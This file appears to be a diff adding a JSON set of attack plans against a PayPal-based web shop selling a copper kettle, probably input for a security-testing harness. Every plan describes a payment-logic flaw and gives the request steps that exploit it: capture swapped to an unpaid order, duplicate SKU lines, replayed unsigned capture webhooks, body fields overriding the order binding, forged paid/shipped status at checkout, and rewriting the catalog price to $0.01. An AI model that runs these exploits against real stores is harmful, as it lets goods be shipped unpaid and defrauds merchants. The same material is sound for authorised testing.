@@ -1,0 +1,326 @@
+{
+  "plans": [
+    {
+      "name": "Capture swap to newest session order",
+      "idea": "The capture endpoint may associate the capture with the newest order stored for the shopper session instead of the shop order bound to the PayPal order ID in the URL.",
+      "expect": "Only the $64 PayPal order for one kettle is captured, but a later unpaid ten-kettle session order is shipped.",
+      "steps": [
+        {
+          "do": "buy",
+          "tamper": {},
+          "blockCapture": true,
+          "save": "b"
+        },
+        {
+          "do": "request",
+          "method": "POST",
+          "path": "/api/checkout/paypal",
+          "body": {
+            "lines": [
+              {
+                "product": "KC-KETTLE",
+                "count": 10
+              }
+            ]
+          },
+          "headers": {},
+          "times": 1,
+          "together": false,
+          "save": "a"
+        },
+        {
+          "do": "request",
+          "method": "POST",
+          "path": "/api/checkout/paypal",
+          "body": {
+            "lines": [
+              {
+                "product": "KC-KETTLE",
+                "count": 10
+              }
+            ]
+          },
+          "headers": {},
+          "times": 1,
+          "together": false,
+          "save": "c"
+        },
+        {
+          "do": "request",
+          "method": "POST",
+          "path": "/api/checkout/paypal/{{b.paypalOrderId}}/capture",
+          "body": {},
+          "headers": {},
+          "times": 1,
+          "together": false
+        }
+      ]
+    },
+    {
+      "name": "Duplicate SKU line split",
+      "idea": "Pricing may collapse duplicate product lines through a map or dictionary while fulfilment sums every stored line, causing the PayPal amount and shipped quantity to diverge.",
+      "expect": "Pay $64 for one kettle but have ten duplicate one-kettle lines fulfilled.",
+      "steps": [
+        {
+          "do": "buy",
+          "tamper": {
+            "lines": [
+              {
+                "product": "KC-KETTLE",
+                "count": 1
+              },
+              {
+                "product": "KC-KETTLE",
+                "count": 1
+              },
+              {
+                "product": "KC-KETTLE",
+                "count": 1
+              },
+              {
+                "product": "KC-KETTLE",
+                "count": 1
+              },
+              {
+                "product": "KC-KETTLE",
+                "count": 1
+              },
+              {
+                "product": "KC-KETTLE",
+                "count": 1
+              },
+              {
+                "product": "KC-KETTLE",
+                "count": 1
+              },
+              {
+                "product": "KC-KETTLE",
+                "count": 1
+              },
+              {
+                "product": "KC-KETTLE",
+                "count": 1
+              },
+              {
+                "product": "KC-KETTLE",
+                "count": 1
+              }
+            ]
+          },
+          "blockCapture": false,
+          "save": "b"
+        }
+      ]
+    },
+    {
+      "name": "Capture webhook transplant",
+      "idea": "The webhook handler may trust custom_id and related order IDs in a replayed capture event, either failing open without signature headers or merely checking that signature headers exist, without tying the capture ID uniquely to the original order.",
+      "expect": "A newly created unpaid order is marked shipped using the legitimate $64 capture, with no capture made for that new PayPal order.",
+      "steps": [
+        {
+          "do": "request",
+          "method": "POST",
+          "path": "/api/checkout/paypal",
+          "body": {
+            "lines": [
+              {
+                "product": "KC-KETTLE",
+                "count": 1
+              }
+            ]
+          },
+          "headers": {},
+          "times": 1,
+          "together": false,
+          "save": "a"
+        },
+        {
+          "do": "webhook",
+          "event": "PAYMENT.CAPTURE.COMPLETED",
+          "edit": {
+            "resource.custom_id": "{{a.body.ref}}",
+            "resource.invoice_id": "{{a.body.ref}}",
+            "resource.supplementary_data.related_ids.order_id": "{{a.body.paypalOrderId}}"
+          },
+          "signed": false,
+          "times": 1
+        },
+        {
+          "do": "request",
+          "method": "POST",
+          "path": "/api/checkout/paypal",
+          "body": {
+            "lines": [
+              {
+                "product": "KC-KETTLE",
+                "count": 1
+              }
+            ]
+          },
+          "headers": {},
+          "times": 1,
+          "together": false,
+          "save": "c"
+        },
+        {
+          "do": "webhook",
+          "event": "PAYMENT.CAPTURE.COMPLETED",
+          "edit": {
+            "resource.custom_id": "{{c.body.ref}}",
+            "resource.invoice_id": "{{c.body.ref}}",
+            "resource.supplementary_data.related_ids.order_id": "{{c.body.paypalOrderId}}"
+          },
+          "signed": true,
+          "times": 1
+        }
+      ]
+    },
+    {
+      "name": "Capture body binding override",
+      "idea": "The capture handler may let fields in its request body override the order binding established by the PayPal order ID in the URL, or may accept a supplied completed capture as proof instead of checking the target PayPal order.",
+      "expect": "The target order ships although its own PayPal order was never approved or captured.",
+      "steps": [
+        {
+          "do": "request",
+          "method": "POST",
+          "path": "/api/checkout/paypal",
+          "body": {
+            "lines": [
+              {
+                "product": "KC-KETTLE",
+                "count": 1
+              }
+            ]
+          },
+          "headers": {},
+          "times": 1,
+          "together": false,
+          "save": "a"
+        },
+        {
+          "do": "request",
+          "method": "POST",
+          "path": "/api/checkout/paypal/{{legit.paypalOrderId}}/capture",
+          "body": {
+            "ref": "{{a.body.ref}}",
+            "shopOrderId": "{{a.body.ref}}",
+            "custom_id": "{{a.body.ref}}",
+            "paypalOrderId": "{{a.body.paypalOrderId}}"
+          },
+          "headers": {},
+          "times": 1,
+          "together": false
+        },
+        {
+          "do": "request",
+          "method": "POST",
+          "path": "/api/checkout/paypal/{{a.body.paypalOrderId}}/capture",
+          "body": {
+            "captureId": "{{legit.captureId}}",
+            "paypalCaptureId": "{{legit.captureId}}",
+            "paypalOrderId": "{{legit.paypalOrderId}}",
+            "orderId": "{{legit.paypalOrderId}}",
+            "status": "COMPLETED",
+            "state": "shipped",
+            "paid": true,
+            "amount": "{{legit.bagTotal}}"
+          },
+          "headers": {},
+          "times": 1,
+          "together": false
+        },
+        {
+          "do": "request",
+          "method": "POST",
+          "path": "/api/checkout/paypal/{{a.body.ref}}/capture",
+          "body": {
+            "ref": "{{a.body.ref}}",
+            "captureId": "{{legit.captureId}}",
+            "paypalOrderId": "{{legit.paypalOrderId}}",
+            "status": "COMPLETED",
+            "paid": true
+          },
+          "headers": {},
+          "times": 1,
+          "together": false
+        }
+      ]
+    },
+    {
+      "name": "Already-paid identity at checkout creation",
+      "idea": "Checkout creation may copy client-supplied order fields into its order record, allowing a new order to inherit the legitimate order reference, PayPal order, capture ID, paid status, or shipped state.",
+      "expect": "A new order is created already treated as paid or shipped, or its subsequent capture succeeds by reusing the legitimate completed payment.",
+      "steps": [
+        {
+          "do": "request",
+          "method": "POST",
+          "path": "/api/checkout/paypal",
+          "body": {
+            "lines": [
+              {
+                "product": "KC-KETTLE",
+                "count": 1
+              }
+            ],
+            "ref": "{{legit.shopOrderId}}",
+            "paypalOrderId": "{{legit.paypalOrderId}}",
+            "captureId": "{{legit.captureId}}",
+            "capture_id": "{{legit.captureId}}",
+            "state": "shipped",
+            "status": "COMPLETED",
+            "paid": true,
+            "amount": "{{legit.bagTotal}}"
+          },
+          "headers": {},
+          "times": 1,
+          "together": false,
+          "save": "a"
+        },
+        {
+          "do": "request",
+          "method": "POST",
+          "path": "/api/checkout/paypal/{{a.body.paypalOrderId}}/capture",
+          "body": {},
+          "headers": {},
+          "times": 1,
+          "together": false
+        }
+      ]
+    },
+    {
+      "name": "Catalog write poisoning",
+      "idea": "Although the storefront only reads the catalog route, the server may also accept a POST update for that route; changing the stored server-side price before checkout would make the later purchase use the poisoned price consistently.",
+      "expect": "A normal subsequent purchase captures only $0.01 while still shipping the copper kettle.",
+      "steps": [
+        {
+          "do": "request",
+          "method": "POST",
+          "path": "/api/catalog",
+          "body": {
+            "sku": "KC-KETTLE",
+            "product": "KC-KETTLE",
+            "name": "Copper Kettle",
+            "price": 0.01
+          },
+          "headers": {},
+          "times": 1,
+          "together": false,
+          "save": "c"
+        },
+        {
+          "do": "buy",
+          "tamper": {
+            "lines": [
+              {
+                "product": "KC-KETTLE",
+                "count": 1
+              }
+            ]
+          },
+          "blockCapture": false,
+          "save": "b"
+        }
+      ]
+    }
+  ]
+}
